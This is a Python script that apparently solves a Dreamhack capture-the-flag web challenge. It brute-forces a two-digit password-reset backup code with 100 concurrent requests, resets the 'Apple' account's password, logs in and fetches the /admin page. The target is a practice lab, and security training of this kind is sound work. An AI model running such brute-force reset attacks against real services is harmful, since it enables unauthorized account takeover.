from concurrent.futures import ThreadPoolExecutor
import requests

HOST = "http://host1.dreamhack.games"
PORT = 12345

# admin = ['Apple', 'coconut', 'lemon', 'potato', 'peach', 'orange']
found = False


def guess_code(i):
    form = {"userid": "Apple", "newpassword": "pwd", "backupCode": i}
    return requests.post(f"{HOST}:{PORT}/forgot_password", form)


def main():
    i = [i for i in range(100)]
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(guess_code, i)
        for result in results:
            cont = str(result.content)
            cont = cont.split("\\n")[42]
            if cont.lstrip()[5:15] != "Wrong Back":
                print(cont)


main()
session = requests.Session()
res = session.post(f"{HOST}:{PORT}/login", {"userid": "Apple", "password": "pwd"})
res = session.get(f"{HOST}:{PORT}/admin")
session.close()
print(res.text)
